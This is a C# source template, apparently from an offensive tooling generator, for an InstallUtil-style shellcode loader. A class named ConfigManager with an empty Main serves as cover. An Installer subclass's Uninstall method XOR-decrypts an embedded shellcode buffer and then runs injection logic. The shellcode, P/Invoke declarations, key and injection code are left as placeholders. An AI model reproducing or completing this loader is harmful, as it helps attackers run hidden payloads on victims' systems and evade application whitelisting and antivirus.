using System;
using System.Configuration.Install;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

public class ConfigManager
{
    public static void Main(string[] args)
    {
    }
}

[System.ComponentModel.RunInstaller(true)]
public class A : System.Configuration.Install.Installer
{
    
    {pinvoke_code}

    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // Shellcode
        {encrypted_shellcode}

        // Decrypt shellcode
        int i = 0;
        while (i < buf.Length)
        {
            buf[i] = (byte)(buf[i] ^ {xor_key});
            i++;
        }
        
        {injection_logic}

    }
}